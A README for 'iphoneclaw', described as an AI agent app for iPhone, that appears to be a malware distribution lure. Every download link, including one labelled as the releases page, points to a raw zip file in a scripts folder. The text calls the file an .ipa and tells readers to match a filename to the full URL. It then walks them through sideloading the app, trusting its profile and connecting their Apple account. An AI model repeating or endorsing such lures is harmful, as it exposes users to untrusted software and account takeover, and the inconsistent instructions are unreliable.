## 📖 About iphoneclaw

iphoneclaw brings smart AI-powered help right into your iPhone. It lets an intelligent agent manage tasks for you, making your device easier to use and more helpful. This open-source tool combines Apple’s features with artificial intelligence to help you save time and get more done. 

Whether you want to automate daily routines, get quick answers, or control apps with simple commands, iphoneclaw aims to improve how you interact with your iPhone.

## 💻 System Requirements

Before installing iphoneclaw, check to make sure your device fits these requirements:

- An iPhone running iOS 13 or later
- At least 100 MB of free storage
- An internet connection to access AI services
- A basic understanding of iPhone settings

This app works on most recent iPhone models. If your phone doesn’t meet these requirements, some features may not work properly.

## 🚀 Getting Started

Follow these steps to get iphoneclaw up and running smoothly on your iPhone:

### 1. Download the Application

Click the big [Download iphoneclaw](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip) button above or visit the [official releases page](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip) to find the latest version.

Since this link points to a general release page, you will see a list of files for different versions and device types.

### 2. Select the Correct File

Look for a file named similarly to `https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip` or a version number that matches your iOS version. The `.ipa` file is the installation package for iPhone apps outside the App Store.

### 3. Transfer the App to Your iPhone

Because iphoneclaw is not from the App Store, you will need to use a tool like Apple’s iTunes or third-party software such as AltStore or Cydia Impactor to install the `.ipa` file.

- Open the tool you choose on your computer.
- Connect your iPhone with a USB cable.
- Load the downloaded `.ipa` file into the tool.
- Follow the tool’s instructions to install the app on your iPhone.

### 4. Trust the App on Your iPhone

After installation:

- Open the **Settings** app on your iPhone.
- Go to **General** > **Device Management** or **Profiles & Device Management**.
- Find the profile related to iphoneclaw.
- Tap **Trust** to allow the app to run.

Without this step, your iPhone will block the app.

### 5. Launch and Configure iphoneclaw

Open the iphoneclaw app. You will see a setup guide that will help you connect the AI agent to your Apple account and enable permissions needed for automation.

Follow the prompts carefully:

- Allow necessary permissions (notifications, voice access, etc.).
- Connect your AI agent by signing in or generating a secure link.
- Customize basic settings to suit your preferences.

At the end, the app will be ready to assist you.
